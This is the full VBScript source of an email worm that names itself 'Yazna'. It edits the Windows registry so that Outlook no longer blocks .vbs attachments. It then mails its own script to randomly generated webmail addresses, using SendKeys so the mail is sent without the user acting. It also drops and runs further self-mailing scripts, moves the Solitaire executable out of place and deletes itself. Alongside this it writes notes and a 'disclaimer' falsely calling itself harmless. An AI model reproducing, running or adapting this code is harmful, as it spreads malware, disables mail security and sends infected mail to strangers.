randomize

decide= Int(Rnd*4)+1
localrule = decide

Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Software\Microsoft\Office\10.0\Outlook\Security", 1 ,"REG_SZ"
WshShell.RegWrite "HKCU\Software\Microsoft\Office\10.0\Outlook\Security\Level1Remove", "vbs"

WshShell.RegWrite "HKCU\Software\Microsoft\Office\11.0\Outlook\Security", 1 ,"REG_SZ"
WshShell.RegWrite "HKCU\Software\Microsoft\Office\11.0\Outlook\Security\Level1Remove", "vbs"

set hope=CreateObject("Scripting.FileSystemObject")                              
 
if   hope.FileExists("c:\windows\temp\++.vbs") Then	

     if localrule=1 then 
        call localrule1
     else if localrule=2 then 
        call localrule2
     else 
        call localrule3
      end if 
    end if  

  sub localrule1 

     on error resume next		

     Set mou = WScript.CreateObject("Scripting.FileSystemObject")
     Set mi = mou.OpenTextFile(Wscript.ScriptFullname, 1)   
     Set you = mou.OpenTextFile("C:\windows\temp\++.vbs", 1)
     set us = mou.CreateTextFile ("C:\windows\temp\together.vbs", 1)

     Do While mi.AtEndOfStream = False 

       uan = mi.ReadLine
       tu = you.ReadLine
       us.WriteLine uan
       us.WriteLine tu

     Loop

    mi.close  
    mou.Deletefile Wscript.ScriptFullname  

  end sub 

  WScript.Quit 

  sub localrule2 

    Set bye = CreateObject("Scripting.FileSystemObject") 
    Set forgive= bye.CreateTextFile("c:\windows\temp\Undertsand.txt", True) 
    set brandnew=bye.CreateTextFile("c:\windows\temp\yazna_.vbs", True) 
 
     forgive.WriteLine " " 
     forgive.WriteLine "                _____________________________________________________" 
     forgive.WriteLine " "              
     forgive.WriteLine "		                 nothing is like it was before  " 
     forgive.WriteLine "		                           " 
     forgive.WriteLine "		                            " 
     forgive.WriteLine "                                    "
     forgive.WriteLine "		                             yazna" 
     forgive.WriteLine " " 
     forgive.WriteLine "                _____________________________________________________"  

     forgive.Close 
  
     brandnew.WriteLine "Randomize"
     brandnew.WriteLine "tit = 0"
     brandnew.WriteLine "Do while abba <> 10 "
     brandnew.WriteLine "Randomize"
     brandnew.WriteLine "number = int(rnd(1) * 8) + 2"
     brandnew.WriteLine " For intCounter = 1 To number"
     brandnew.WriteLine "  Randomize"
     brandnew.WriteLine "  intDecimal = Int((26 * Rnd) + 1) + 96"
     brandnew.WriteLine "   str = str & Chr(intDecimal)        "
     brandnew.WriteLine "   when = int(rnd(1) * 10) + 1 "
     brandnew.WriteLine "   select case when"
     brandnew.WriteLine "   case 1 "
     brandnew.WriteLine "   case 2"
     brandnew.WriteLine "   a=""@msn.com"" "
     brandnew.WriteLine "   case 3"
     brandnew.WriteLine "     a=""@email.com""   "
     brandnew.WriteLine "     case 4   "
     brandnew.WriteLine "     a=""@yahoo.com""   "
     brandnew.WriteLine "     case 5 "
     brandnew.WriteLine "     a=""@lycos.com""    "
     brandnew.WriteLine "     case 6    "
     brandnew.WriteLine "     a=""@excite.com""   "
     brandnew.WriteLine "     case 7       "
     brandnew.WriteLine "     a=""@hotmail.com""      "
     brandnew.WriteLine "     case 8        "
     brandnew.WriteLine "     a=""@libero.it""   "
     brandnew.WriteLine "     case 9   "
     brandnew.WriteLine "     a=""@tin.it""   "
     brandnew.WriteLine "     case 10   "
     brandnew.WriteLine "     a=""@aol.com""   "
     brandnew.WriteLine "     end select  "
     brandnew.WriteLine "     Next  "
     brandnew.WriteLine " abba = abba +1  "
     brandnew.WriteLine " scaio = scaio  & "" ; "" + str & a  "
     brandnew.WriteLine " dsadsa = str & a   "
     brandnew.WriteLine " str = null  "
     brandnew.WriteLine " loop  "
     brandnew.WriteLine " Set myOlApp = CreateObject(""Outlook.Application"")  "
     brandnew.WriteLine " Set myItem = myOlApp.CreateItem(olMailItem)  "
     brandnew.WriteLine " myItem.To = dsadsa  "
     brandnew.WriteLine " myItem.cc = scaio  "
     brandnew.WriteLine " Set myAttachments = myItem.Attachments  "
     brandnew.WriteLine " myAttachments.Add Wscript.ScriptFullName  "
     brandnew.WriteLine " myItem.Subject = ""Yazna""   "
     brandnew.WriteLine " myItem.Body = ""read my letter""  "
     brandnew.WriteLine " myItem.display  "
     brandnew.WriteLine " set WshShell = WScript.CreateObject(""WScript.Shell"")  "
     brandnew.WriteLine " myItem.DeleteAfterSubmit = True  "
     brandnew.WriteLine " wshShell.SendKeys ""+^{TAB 2}{ENTER}"" "
     brandnew.close       	

    on error resume next

    Set restart = WScript.CreateObject("WScript.Shell")
    restart.Run "c:\windows\temp\yazna_.vbs"
    Wscript.Sleep(3000)
    set change=createobject ("scripting.filesystemobject")
    change.deletefile "c:\windows\temp\yazna.vbs"
    Wscript.Sleep(3000)
    bye.Deletefile WScript.ScriptFullname  

  end sub 

  Wscript.Quit
             
  sub localrule3 
 
   Set fff = CreateObject("Scripting.FileSystemObject") 
   Set ttt= fff.CreateTextFile("c:\windows\temp\0-0.vbs", True) 

    ttt.WriteLine "set pappappero = CreateObject(""Scripting.FileSystemobject"") "
    ttt.WriteLine "if pappappero.Fileexists(""c:\windows\sol.exe"") then "
    ttt.WriteLine "pappappero.movefile ""c:\windows\sol.exe"", ""c:\windows\temp\""  "
    ttt.WriteLine "else if pappappero.Fileexists(""c:\windows\system32\sol.exe"") then "
    ttt.WriteLine "on error resume next"
    ttt.WriteLine "pappappero.movefile ""c:\windows\system32\sol.exe"", ""c:\windows\temp\""  "
    ttt.WriteLine "end if   "
    ttt.WriteLine "end if"
    ttt.WriteLine "Randomize"
    ttt.WriteLine "tit = 0"
    ttt.WriteLine "Do while abba <> 40 "
    ttt.WriteLine "Randomize"
    ttt.WriteLine "number = int(rnd(1) * 8) + 2"
    ttt.WriteLine " For intCounter = 1 To number"
    ttt.WriteLine "  Randomize"
    ttt.WriteLine "  intDecimal = Int((26 * Rnd) + 1) + 96"
    ttt.WriteLine "   str = str & Chr(intDecimal)        "
    ttt.WriteLine "   when = int(rnd(1) * 10) + 1 "
    ttt.WriteLine "   select case when"
    ttt.WriteLine "   case 1 "
    ttt.WriteLine "   case 2"
    ttt.WriteLine "   a=""@msn.com"" "
    ttt.WriteLine "   case 3"
    ttt.WriteLine "     a=""@email.com""   "
    ttt.WriteLine "     case 4   "
    ttt.WriteLine "     a=""@yahoo.com""   "
    ttt.WriteLine "     case 5 "
    ttt.WriteLine "     a=""@lycos.com""    "
    ttt.WriteLine "     case 6    "
    ttt.WriteLine "     a=""@excite.com""   "
    ttt.WriteLine "     case 7       "
    ttt.WriteLine "     a=""@hotmail.com""      "
    ttt.WriteLine "     case 8        "
    ttt.WriteLine "     a=""@libero.it""   "
    ttt.WriteLine "     case 9   "
    ttt.WriteLine "     a=""@tin.it""   "
    ttt.WriteLine "     case 10   "
    ttt.WriteLine "     a=""@aol.com""   "
    ttt.WriteLine "     end select  "
    ttt.WriteLine "     Next  "
    ttt.WriteLine " abba = abba +1  "
    ttt.WriteLine " scaio = scaio  & "" ; "" + str & a  "
    ttt.WriteLine " dsadsa = str & a   "
    ttt.WriteLine " str = null  "
    ttt.WriteLine " loop  "
    ttt.WriteLine " Set myOlApp = CreateObject(""Outlook.Application"")  "
    ttt.WriteLine " Set myItem = myOlApp.CreateItem(olMailItem)  "
    ttt.WriteLine " myItem.To = dsadsa  "
    ttt.WriteLine " myItem.cc = scaio  "
    ttt.WriteLine " Set myAttachments = myItem.Attachments  "
    ttt.WriteLine " myAttachments.Add Wscript.ScriptFullName  "
    ttt.WriteLine " myItem.Subject = ""Vi-Con""   "
    ttt.WriteLine " myItem.Body = ""0-0""  "
    ttt.WriteLine " myItem.display  "
    ttt.WriteLine " set WshShell = WScript.CreateObject(""WScript.Shell"")  "
    ttt.WriteLine " myItem.DeleteAfterSubmit = True  "
    ttt.WriteLine " wshShell.SendKeys ""+^{TAB 2}{ENTER}"" "

    ttt.close       			  

   Wscript.Sleep(5000)
   Set wShell = WScript.CreateObject("WScript.Shell")
   WShell.Run "c:\windows\temp\0-0.vbs"
   Wscript.Sleep(3000)
   fff.deletefile "c:\windows\temp\0-0.vbs"
 
  end sub 

  WScript.Quit

end if

  If hope.FolderExists("c:\windows\temp\++\") Then	   

  call hasbeen

 sub hasbeen()

   mytime = now
   hotel = "c:\windows\temp\yazna\" 
   Set filesys = WScript.CreateObject("Scripting.FileSystemObject")  
   If Not filesys.FolderExists(hotel) Then 
   Set room = filesys.CreateFolder(hotel)
   Set guest = room.CreatetextFile("yazna.txt", True) 
   Set guest2 = room.CreateTextFile ("disclaimer.txt", True)

    guest.WriteLine("                *                    ") 
    guest.WriteLine("                *    *               * ") 
    guest.WriteLine("                  *       *              *") 
    guest.WriteLine(" 		     *         *          * * ") 
    guest.WriteLine("                   *    *    *       *     ") 
    guest.WriteLine("               *  *    *  *    *       ") 
    guest.WriteLine("  		        * *         ") 
    guest.WriteLine("                          *       ") 
    guest.WriteLine("   		              *    ")  				         
    guest.WriteLine("")  		
    guest.WriteLine("i was looking for ++ on your computer")  		
    guest.WriteLine("    on " & mytime)  		
    guest.WriteLine("i couldn't find him")  			
    guest.WriteLine("but I know it has layed here") 
    guest.WriteLine("") 
    guest.WriteLine("yazna") 
    guest.Close 

    guest2.WriteLine("") 
    guest2.WriteLine("") 
    guest2.WriteLine("      Yazna is a virus that entered your system on " & Mytime) 
    guest2.WriteLine("")  
    guest2.WriteLine("      it didn't cause any damage to your computer") 
    guest2.WriteLine("      nor it will do so in the future. ") 
    guest2.WriteLine("      it's been a friendly passage.") 
    guest2.WriteLine("")
    guest2.WriteLine("      {www.vi-con.net}" )		
    guest2.Close 

   end if 
  
 end sub  

  call sublook 

  else 

   on error resume next

   set reg = createObject("wscript.Shell")
   verify = reg.regread("HKCU\++\")				
   if verify <> 0 then						

  else

   mytime = now
   hotel = "c:\windows\temp\yazna\"
   Set filesys = CreateObject("Scripting.FileSystemObject") 
   If Not filesys.FolderExists(hotel) Then 
   Set room = filesys.CreateFolder(hotel)
   Set guest = room.CreatetextFile("yazna.txt", True) 
   Set guest2 = room.CreateTextFile ("disclaimer.txt", True)

    guest.WriteLine("                *                    ") 
    guest.WriteLine("                *    *               * ") 
    guest.WriteLine("                  *       *              *") 
    guest.WriteLine(" 		     *         *          * * ") 
    guest.WriteLine("                   *    *    *       *     ") 
    guest.WriteLine("               *  *    *  *    *       ") 
    guest.WriteLine("  		        * *         ") 
    guest.WriteLine("                          *       ") 
    guest.WriteLine("   		              *    ")  				         
    guest.WriteLine("")  		
    guest.WriteLine("i was looking for ++ on your computer")  		
    guest.WriteLine("    on " & mytime)  		
    guest.WriteLine("I couldn't find him")  			
    guest.WriteLine("but I know it has layed here")
    guest.WriteLine("") 
    guest.WriteLine("yazna") 
    guest.Close  

    guest2.WriteLine("") 
    guest2.WriteLine("") 
    guest2.WriteLine("      Yazna is a virus that entered your system on " & Mytime) 
    guest2.WriteLine("")  
    guest2.WriteLine("      it didn't cause any damage to your computer") 
    guest2.WriteLine("      nor it will do so in the future. ") 
    guest2.WriteLine("      it's been a friendly passage.") 
    guest2.WriteLine("")
    guest2.WriteLine("      {www.vi-con.net}" )		
    guest.Close 

   end if

  call sublook

  sub sublook () 				

   Randomize

   abba = Int(5*Rnd) +1
   tit = 0

   Do while abba <> 10 

      Randomize

      number = int(rnd(1) * 8) + 2              
      For intCounter = 1 To number                 

      Randomize 
 
       intDecimal = Int((26 * Rnd) + 1) + 96      
       str = str & Chr(intDecimal)                  
       when = int(rnd(1) * 10) + 1                 
 
       select case when

        case 1
        a="@hotmail.com"
        case 2
        a="@msn.com"
        case 3
        a="@email.com"
        case 4
        a="@yahoo.com"
        case 5
        a="@gmail.com"
        case 6
        a="@zaza.com"
        case 7
        a="@esdc.com"
        case 8
        a="@ermall.com"
        case 9
        a="@sudora.com"
        case 10
        a="@aol.com"
        end select

       Next

   abba = abba + 1
   scaio = scaio  & " ; " + str & a
   dsadsa = str & a
   str = null

  loop

  Set myOlApp = CreateObject("Outlook.Application")
  Set myItem = myOlApp.CreateItem(olMailItem)
  Set myAttachments = myItem.Attachments
  Set fso=createobject ("scripting.filesystemobject")
   myItem.To = dsadsa
   myItem.cc = scaio
   myAttachments.Add Wscript.ScriptFullName
   myItem.Subject = "Vi-Con"
   myItem.Body = "^_^"
   myItem.display
   set WshShell = WScript.CreateObject("WScript.Shell")
   myItem.DeleteAfterSubmit = True
   wshShell.SendKeys "+^{TAB 2}{ENTER}"
 							 			 
   fso.Deletefile WScript.ScriptFullname  
 	           			
  end sub
      
 end if 

end If

WScript.sleep(9000)

WshShell.RegDelete "HKCU\Software\Microsoft\Office\10.0\Outlook\Security\Level1Remove"
WshShell.RegDelete "HKCU\Software\Microsoft\Office\11.0\Outlook\Security\Level1Remove"
